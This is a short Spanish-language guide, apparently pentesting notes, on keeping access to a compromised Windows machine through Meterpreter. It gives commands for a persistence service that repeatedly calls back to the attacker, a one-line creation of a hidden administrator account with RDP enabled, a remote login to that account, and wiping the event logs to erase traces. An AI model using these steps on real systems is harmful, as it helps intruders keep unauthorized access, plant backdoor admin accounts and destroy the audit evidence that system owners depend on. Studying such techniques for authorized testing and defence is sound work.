<h1 align="center">PERSISTENCIA EN WINDOWS</h1>

La persistencia permite mantener el acceso a un sistema vulnerado incluso después de reinicios o cambios en las contraseñas de los usuarios. Para implementar la persistencia, necesitamos tener privilegios elevados en el sistema comprometido

## **Persistencia con el Módulo persistence_service**

Poner la Sesión de Meterpreter en Segundo Plano y buscar el Módulo de Persistencia

- search persistence_service

Establece la sesión y el payload correspondiente. Este módulo lo que hace es crear un servicio para la máquina víctima que continuamente solicita la conexión por el puerto asignado. Puedes verificar que la persistencia está funcionando matando todas las sesiones de Meterpreter y poniéndote a la escucha con multi/handler asignando el mismo payload y puerto que antes

- sessions -k
- use multi/handler

##

## **Persistencia vía RDP**

Si deseas establecer la persistencia a través del protocolo RDP, lo puedes hacer de un solo comando en meterpreter

- run getgui -e -u alexis -p hacker_123321
  - **run getgui**: Verifica si el servicio RDP está habilitado. Si no lo está, lo habilita.
  - **\-e**: Ejecuta la creación del usuario alexis con la contraseña hacker_123321 y lo añade al grupo de administradores.

Ahora, puedes usar la herramienta xfreerdp para conectarte al nuevo usuario creado a través de una interfaz grafica:

- xfreerdp /v:&lt;ip&gt; /u:alexis /p:hacker_123321

##

## **Borrar el Visor de Eventos para No Dejar Rastro**

Para eliminar las huellas de las actividades realizadas, puedes borrar los eventos del visor de eventos utilizando el siguiente comando en Meterpreter:

- clearev
